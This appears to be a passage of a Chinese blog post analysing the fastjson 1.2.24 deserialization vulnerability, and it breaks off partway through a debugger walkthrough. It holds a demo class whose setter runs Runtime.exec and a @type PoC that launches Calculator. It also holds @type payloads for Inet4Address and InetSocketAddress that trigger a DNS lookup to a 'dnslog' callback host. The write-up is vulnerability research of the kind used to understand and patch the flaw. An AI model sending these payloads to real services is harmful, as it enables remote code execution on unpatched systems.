        <li><a class="icon" aria-label="下一篇 " href="/2022/11/11/fastjson%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="返回顶部 " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="分享文章 " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">返回顶部</span>
      <span id="i-share" class="info" style="display:none;">分享文章</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.24%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.24%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&text=fastjson 1.2.24漏洞分析"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.24%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson 1.2.24漏洞分析"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.24%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&is_video=false&description=fastjson 1.2.24漏洞分析"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=fastjson 1.2.24漏洞分析&body=Check out this article: http://blog.ninefiger.top/2022/11/11/fastjson%201.2.24%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.24%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson 1.2.24漏洞分析"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.24%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson 1.2.24漏洞分析"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.24%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson 1.2.24漏洞分析"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.24%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson 1.2.24漏洞分析"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.24%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&name=fastjson 1.2.24漏洞分析&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.24%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&t=fastjson 1.2.24漏洞分析"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%A8%A1%E6%8B%9F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.</span> <span class="toc-text">1. 模拟命令执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">2.</span> <span class="toc-text">2. 利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-DNS%E8%AF%B7%E6%B1%82"><span class="toc-number">2.1.</span> <span class="toc-text">2.1 DNS请求</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-1-java-net-Inet4Address"><span class="toc-number">2.1.1.</span> <span class="toc-text">2.1.1 java.net.Inet4Address</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-2-%E8%A1%A5%E5%85%85-%E5%86%85%E7%BD%AE%E6%9C%89deserializer%E5%AF%B9%E5%BA%94%E7%9A%84%E7%B1%BB%E5%90%8D"><span class="toc-number">2.1.2.</span> <span class="toc-text">2.1.2 补充-内置有deserializer对应的类名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-2-%E8%A1%A5%E5%85%85-Inet4Address%E8%A7%A3%E6%9E%90%E5%9F%9F%E5%90%8D"><span class="toc-number">2.1.3.</span> <span class="toc-text">2.1.2 补充-Inet4Address解析域名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-4-java-net-URL"><span class="toc-number">2.1.4.</span> <span class="toc-text">2.1.4 java.net.URL</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-5-poc%E6%9E%84%E9%80%A0"><span class="toc-number">2.1.5.</span> <span class="toc-text">2.1.5 poc构造</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">2.2.</span> <span class="toc-text">2.2 TemplatesImpl利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-1-%E6%B3%A8%E6%84%8F%E7%A7%81%E6%9C%89%E5%AD%97%E6%AE%B5%E7%9A%84%E8%B5%8B%E5%80%BC"><span class="toc-number">2.2.1.</span> <span class="toc-text">2.2.1 注意私有字段的赋值</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-2-%E6%95%B0%E7%BB%84%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%8F%98%E9%87%8F"><span class="toc-number">2.2.2.</span> <span class="toc-text">2.2.2 数组类型的变量</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-3-getOutputProperties"><span class="toc-number">2.2.3.</span> <span class="toc-text">2.2.3 getOutputProperties</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-4-%E7%BB%93%E5%90%88CB%E5%88%A9%E7%94%A8%E9%93%BE%E7%9A%84%E6%96%B0%E6%80%9D%E8%B7%AF"><span class="toc-number">2.2.4.</span> <span class="toc-text">2.2.4 结合CB利用链的新思路</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-BCEL%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">2.3.</span> <span class="toc-text">2.3 BCEL利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-1-BasicDataSource%E5%85%B3%E9%94%AE%E7%B1%BB"><span class="toc-number">2.3.1.</span> <span class="toc-text">2.3.1 BasicDataSource关键类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-2-JSON-parseObject"><span class="toc-number">2.3.2.</span> <span class="toc-text">2.3.2 JSON.parseObject()</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#2-3-2-1-JSON-toJSON-obj"><span class="toc-number">2.3.2.1.</span> <span class="toc-text">2.3.2.1 JSON.toJSON(obj)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-3-2-2-createJavaBeanSerializer%E5%92%8CcreateASMSerializer%E4%B8%AD%E5%88%9B%E5%BB%BAsortedGetters"><span class="toc-number">2.3.2.2.</span> <span class="toc-text">2.3.2.2 createJavaBeanSerializer和createASMSerializer中创建sortedGetters</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-3-2-3-FieldInfo-get-%E6%96%B9%E6%B3%95%E8%A7%A6%E5%8F%91invoke%E6%89%A7%E8%A1%8C"><span class="toc-number">2.3.2.3.</span> <span class="toc-text">2.3.2.3 FieldInfo.get()方法触发invoke执行</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-3-%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8JSON-parse-%E8%A7%A6%E5%8F%91"><span class="toc-number">2.3.3.</span> <span class="toc-text">2.3.3 如何使用JSON.parse()触发</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#2-3-3-1-Type%E4%B8%BAJSONObject%E7%B1%BB%E6%97%B6"><span class="toc-number">2.3.3.1.</span> <span class="toc-text">2.3.3.1 @Type为JSONObject类时</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-3-3-2-%E6%89%A7%E8%A1%8C%E5%88%B0key-toString-%E6%96%B9%E6%B3%95"><span class="toc-number">2.3.3.2.</span> <span class="toc-text">2.3.3.2 执行到key.toString()方法</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-3-3-3-%E8%A7%A6%E5%8F%91invoke"><span class="toc-number">2.3.3.3.</span> <span class="toc-text">2.3.3.3 触发invoke</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-3-3-4-poc%E6%9E%84%E9%80%A0"><span class="toc-number">2.3.3.4.</span> <span class="toc-text">2.3.3.4 poc构造</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-4-%E5%9B%9E%E6%98%BE%E5%92%8C%E5%86%85%E5%AD%98%E9%A9%ACEXP"><span class="toc-number">2.3.4.</span> <span class="toc-text">2.3.4 回显和内存马EXP</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#2-3-4-1-%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%9D%97%E4%BD%8D%E7%BD%AE"><span class="toc-number">2.3.4.1.</span> <span class="toc-text">2.3.4.1 恶意代码块位置</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-3-4-2-%E5%BC%B9%E5%87%BA%E8%AE%A1%E7%AE%97%E5%99%A8"><span class="toc-number">2.3.4.2.</span> <span class="toc-text">2.3.4.2 弹出计算器</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-3-4-3-%E5%9B%9E%E6%98%BE"><span class="toc-number">2.3.4.3.</span> <span class="toc-text">2.3.4.3 回显</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-3-4-4-%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">2.3.4.4.</span> <span class="toc-text">2.3.4.4 内存马</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-4-JdbcRowSetImpl%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">2.4.</span> <span class="toc-text">2.4 JdbcRowSetImpl利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-4-1-JNDI%E8%B0%83%E7%94%A8"><span class="toc-number">2.4.1.</span> <span class="toc-text">2.4.1 JNDI调用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-4-2-%E8%A7%A6%E5%8F%91%E9%93%BEsetAutoCommit"><span class="toc-number">2.4.2.</span> <span class="toc-text">2.4.2 触发链setAutoCommit</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-4-3-Poc"><span class="toc-number">2.4.3.</span> <span class="toc-text">2.4.3 Poc</span></a></li></ol></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        fastjson 1.2.24漏洞分析
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">ninefiger</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2022-11-11T06:01:00.000Z" itemprop="datePublished">2022-11-11</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/%E6%94%BB%E9%98%B2%E7%A0%94%E7%A9%B6/">攻防研究</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/fastjson/" rel="tag">fastjson</a>, <a class="tag-link-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag">漏洞分析</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <pre><code>  通过fastjson解析json字符串的流程得知：`@type`对应类名，通过获取`setXxx`或`set_Xxx`方法，对应`xxx`属性，先创建一个类对象，再通过invoke调用`setXxx`方法进行赋值
</code></pre>
<h2 id="1-模拟命令执行"><a href="#1-模拟命令执行" class="headerlink" title="1. 模拟命令执行"></a>1. 模拟命令执行</h2><p>因此只需要找到一个setXxx中存在代码执行的类构造利用链，比如下面这个示例：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> vuln.POJO;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">evilClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//恶意代码</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(name);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> vuln;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> vuln.POJO.evilClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">poc_1_2_24</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String poc = <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;vuln.POJO.evilClass\&quot;,\&quot;name\&quot;:\&quot;open /System/Applications/Calculator.app\&quot;&#125;&quot;</span>;</span><br><span class="line">        evilClass object = (evilClass)JSON.parse(poc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666690814437-84669d06-7c15-4dd0-87af-ef70825afafd.png#averageHue=%23e8e5e2&clientId=u530b9ee2-d505-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=368&id=u4b8a87ed&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1072&originWidth=1838&originalType=binary&ratio=1&rotation=0&showTitle=false&size=254069&status=done&style=none&taskId=ua18bf7b1-8f69-466f-93b8-a09840fe845&title=&width=631" alt="image.png"></p>
<h2 id="2-利用链"><a href="#2-利用链" class="headerlink" title="2. 利用链"></a>2. 利用链</h2><h3 id="2-1-DNS请求"><a href="#2-1-DNS请求" class="headerlink" title="2.1 DNS请求"></a>2.1 DNS请求</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.net.Inet4Address&quot;</span>,<span class="attr">&quot;val&quot;</span>:<span class="string">&quot;dnslog&quot;</span>&#125;</span><br><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.net.InetSocketAddress&quot;</span>&#123;<span class="attr">&quot;address&quot;</span>:,<span class="attr">&quot;val&quot;</span>:<span class="string">&quot;dnslog&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
<h4 id="2-1-1-java-net-Inet4Address"><a href="#2-1-1-java-net-Inet4Address" class="headerlink" title="2.1.1 java.net.Inet4Address"></a>2.1.1 java.net.Inet4Address</h4><p>直接看<code>java.net.Inet4Address</code>类，并没有找到属性值；通过调试发现，该类并没有走之前那个流程，他的<code>deserializer</code>是系统中默认就有的<br>于是查看<code>getDeserializer</code>方法，进入<code>this.derializers.get(type);</code>中，遍历所有内置映射好的类；发现其中就包括<code>java.net.Inet4Address</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666692623030-e2458c0f-8d76-4599-bdc1-4bf5703a189e.png#averageHue=%23f5f0ec&clientId=u530b9ee2-d505-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=172&id=qeIeq&margin=%5Bobject%20Object%5D&name=image.png&originHeight=382&originWidth=1540&originalType=binary&ratio=1&rotation=0&showTitle=false&size=106228&status=done&style=none&taskId=u4a3565cb-4a4c-4abc-9795-d87726c011c&title=&width=692" alt="image.png"></p>
<h4 id="2-1-2-补充-内置有deserializer对应的类名"><a href="#2-1-2-补充-内置有deserializer对应的类名" class="headerlink" title="2.1.2 补充-内置有deserializer对应的类名"></a>2.1.2 补充-内置有deserializer对应的类名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">java.util.concurrent.atomic.AtomicBoolean</span><br><span class="line">com.alibaba.fastjson.JSONObject</span><br><span class="line">byte</span><br><span class="line">java.sql.Date</span><br><span class="line">java.lang.StringBuilder</span><br><span class="line">java.lang.Double</span><br><span class="line">java.sql.Timestamp</span><br><span class="line">java.lang.Cloneable</span><br><span class="line">java.lang.StackTraceElement</span><br><span class="line">java.math.BigDecimal</span><br><span class="line">boolean</span><br><span class="line">java.util.UUID</span><br><span class="line">java.net.URI</span><br><span class="line">java.util.TimeZone</span><br><span class="line">java.util.Map</span><br><span class="line">java.math.BigInteger</span><br><span class="line">java.lang.Long</span><br><span class="line">java.lang.Class</span><br><span class="line">java.io.Closeable</span><br><span class="line">[C</span><br><span class="line">java.io.File</span><br><span class="line">char</span><br><span class="line">java.net.InetSocketAddress</span><br><span class="line">double</span><br><span class="line">java.util.concurrent.atomic.AtomicLong</span><br><span class="line">java.io.Serializable</span><br><span class="line">com.alibaba.fastjson.JSONPath</span><br><span class="line">java.util.concurrent.ConcurrentHashMap</span><br><span class="line">java.util.concurrent.atomic.AtomicReference</span><br><span class="line">java.lang.Integer</span><br><span class="line">java.util.Date</span><br><span class="line">java.util.ArrayList</span><br><span class="line">java.util.Locale</span><br><span class="line">java.lang.Boolean</span><br><span class="line">java.lang.Number</span><br><span class="line">java.util.List</span><br><span class="line">java.util.Currency</span><br><span class="line">java.net.Inet6Address</span><br><span class="line">java.lang.Short</span><br><span class="line">java.util.concurrent.atomic.AtomicLongArray</span><br><span class="line">java.util.concurrent.ConcurrentMap</span><br><span class="line">java.net.Inet4Address</span><br><span class="line">java.util.Collection</span><br><span class="line">java.util.Calendar</span><br><span class="line">java.lang.ref.SoftReference</span><br><span class="line">int</span><br><span class="line">javax.xml.datatype.XMLGregorianCalendar</span><br><span class="line">java.util.regex.Pattern</span><br><span class="line">java.net.InetAddress</span><br><span class="line">short</span><br><span class="line">java.util.concurrent.atomic.AtomicInteger</span><br><span class="line">com.alibaba.fastjson.JSONArray</span><br><span class="line">java.nio.charset.Charset</span><br><span class="line">java.util.LinkedHashMap</span><br><span class="line">java.util.TreeMap</span><br><span class="line">long</span><br><span class="line">java.lang.StringBuffer</span><br><span class="line">java.lang.Comparable</span><br><span class="line">java.text.SimpleDateFormat</span><br><span class="line">float</span><br><span class="line">java.sql.Time</span><br><span class="line">java.lang.ref.WeakReference</span><br><span class="line">java.lang.String</span><br><span class="line">java.util.HashMap</span><br><span class="line">java.lang.Character</span><br><span class="line">java.lang.Byte</span><br><span class="line">java.lang.Object</span><br><span class="line">java.lang.Float</span><br><span class="line">java.util.concurrent.atomic.AtomicIntegerArray</span><br><span class="line">java.net.URL</span><br></pre></td></tr></table></figure>
<p>获取到的类为<code>MiscCodec</code>，因此反序列化的方法在 <code>com.alibaba.fastjson.serializer#deserialze</code>中</p>
<ul>
<li>如下图中，当类是<code>InetSocketAddress</code>时，会单独处理</li>
<li>会判断参数是否为<code>val</code>，然后进入<code>parse.parse()</code>解析流程</li>
</ul>
<p> <img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666693058473-a80b1426-fa22-4059-85b7-3a5740ee442d.png#averageHue=%23f7f6f4&clientId=u530b9ee2-d505-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=508&id=ub940bae6&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1538&originWidth=2046&originalType=binary&ratio=1&rotation=0&showTitle=false&size=434071&status=done&style=none&taskId=u99ec2222-8205-4d95-a446-4df0e4e4a1f&title=&width=676" alt="image.png"><br>如图，在解析过程中，判断了类的类型，进入<code>InetAddress.getName(strVal)</code>中<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666747762762-b1b03c96-dc7c-4c03-a18f-be7b8dd2d871.png#averageHue=%23f6f4f1&clientId=u530b9ee2-d505-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=472&id=u3848ae80&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1504&originWidth=1990&originalType=binary&ratio=1&rotation=0&showTitle=false&size=410878&status=done&style=none&taskId=uc92e1f69-5cb9-4392-9822-85ef84f9053&title=&width=625" alt="image.png"></p>
<h4 id="2-1-2-补充-Inet4Address解析域名"><a href="#2-1-2-补充-Inet4Address解析域名" class="headerlink" title="2.1.2 补充-Inet4Address解析域名"></a>2.1.2 补充-Inet4Address解析域名</h4><p>a. <code>InetAddress.getAllByName</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666748204892-915289b5-b995-4698-b19a-09dc152ce245.png#clientId=u530b9ee2-d505-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=244&id=ufdded8a1&margin=%5Bobject%20Object%5D&name=image.png&originHeight=694&originWidth=1884&originalType=binary&ratio=1&rotation=0&showTitle=false&size=171920&status=done&style=none&taskId=ucc98d2bc-a599-4249-a785-f0917618cd2&title=&width=662" alt="image.png"><br>b. 判断是否为IP地址<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666748276936-1352d674-0248-40bd-a14e-c6f1ec2cbeb1.png#clientId=u530b9ee2-d505-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=518&id=ud070774d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1380&originWidth=1800&originalType=binary&ratio=1&rotation=0&showTitle=false&size=269788&status=done&style=none&taskId=ue8ad5a3d-44db-4f98-90a0-a1add378e5f&title=&width=676" alt="image.png"><br>c. 判断cache中是否有缓存的域名解析地址，如果没有，则通过<code>getAddressesFromNameService</code>解析<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666748335300-3037b79a-409d-42be-ad92-eb71d7200940.png#clientId=u530b9ee2-d505-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=567&id=u9665bff3&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1442&originWidth=1752&originalType=binary&ratio=1&rotation=0&showTitle=false&size=248737&status=done&style=none&taskId=ue3d244c0-6233-48b0-acb6-723e5336cf1&title=&width=689" alt="image.png"><br>d. 接下来<code>lookupAllHostAddr</code>中就是一些解析域名的操作，先不跟入了<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666748593490-4dd25a55-88ed-474f-9a34-0ff49b47db11.png#clientId=u530b9ee2-d505-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=874&id=uc9be80ed&margin=%5Bobject%20Object%5D&name=image.png&originHeight=2154&originWidth=1670&originalType=binary&ratio=1&rotation=0&showTitle=false&size=322005&status=done&style=none&taskId=ua2e3b849-110b-47fd-9193-687856daf98&title=&width=678" alt="image.png"></p>
<h4 id="2-1-4-java-net-URL"><a href="#2-1-4-java-net-URL" class="headerlink" title="2.1.4 java.net.URL"></a>2.1.4 java.net.URL</h4><p>查看<code>MiscCodec</code>反序列化工具类，针对URL类的实例化处理只是<code>new URL</code>，那怎么触发DNS请求呢<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666750600101-7779306b-e157-4fd6-8cdd-ed1bd323ec4f.png#averageHue=%23fbf9f8&clientId=u530b9ee2-d505-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=338&id=u43c7ed76&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1034&originWidth=2108&originalType=binary&ratio=1&rotation=0&showTitle=false&size=195649&status=done&style=none&taskId=u185e34cc-e07e-4296-bb1b-a01df7f9ea8&title=&width=689" alt="image.png"><br><strong>没有思路的时候，可能是因为没有将反序列化流程完全分析到</strong></p>
<ul>
<li>首先在创建<code>DefaultJSONParser</code>时，将Set取出，并指定对应的token值</li>
<li>然后在paser方法时，进入指定的<code>SET</code>分支，进入<code>parseArray</code>方法</li>
<li>其中<code>[]</code>中<code>@type</code>对应的解析方法和之前一样是<code>parseObject(object, i);</code></li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666750723449-dd10de0d-0778-4b85-93f9-a8d627e5c3c6.png#averageHue=%23f8f4f3&clientId=u530b9ee2-d505-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=552&id=u002841f6&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1104&originWidth=1680&originalType=binary&ratio=1&rotation=0&showTitle=false&size=273276&status=done&style=none&taskId=u783b844b-1a48-4be6-9f09-49705a614df&title=&width=840" alt="image.png"><br>完成<code>@type</code>的反序列化操作后，进行<code>HashSet.add</code>操作<br><img 